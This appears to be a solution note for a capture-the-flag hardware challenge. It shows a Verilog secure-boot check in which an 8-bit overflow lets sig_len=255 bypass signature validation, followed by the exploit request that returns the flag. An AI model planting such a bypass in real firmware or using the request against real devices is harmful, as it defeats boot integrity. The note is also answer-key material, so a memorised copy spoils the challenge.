# Secure Boot Integer Overflow - Solution Notes

## Vulnerability
`secure_boot.v` has an 8-bit overflow in the length check:

```verilog
wire [7:0] len_plus_one = sig_len + 8'h01;  // wraps at 255!
wire       overflow_ok  = (len_plus_one == 8'h00);  // true when sig_len=255
assign boot_granted = sig_valid || overflow_ok;
```

## Attack Method
1. Read `/opt/assets/secure_boot.v` and find the overflow condition
2. Send `sig_len=255`: `255 + 1 = 0` (mod 256), passes the `== 0` check
3. POST `{"sig_len": 255, "sig_byte": 0}` to `http://target:8101/verify`
4. Response includes `"boot_granted": true` and `"flag"`
